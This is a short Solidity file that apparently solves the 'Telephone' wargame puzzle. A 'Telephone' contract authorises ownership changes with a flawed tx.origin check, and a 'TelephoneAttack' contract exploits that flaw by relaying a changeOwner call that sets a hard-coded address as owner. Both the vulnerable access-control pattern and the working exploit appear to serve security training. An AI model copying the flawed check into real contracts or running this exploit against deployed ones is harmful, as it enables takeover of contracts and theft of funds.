// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneAttack{
    Telephone TelephoneInstance;

    constructor(address _TelephoneAddress){
        TelephoneInstance = Telephone(_TelephoneAddress);
    }

    function changeOwnerAttack() external {
        TelephoneInstance.changeOwner(0xD26D6EA83bd7F54006e80d5f2134d20eC5aF85c4);
    }

}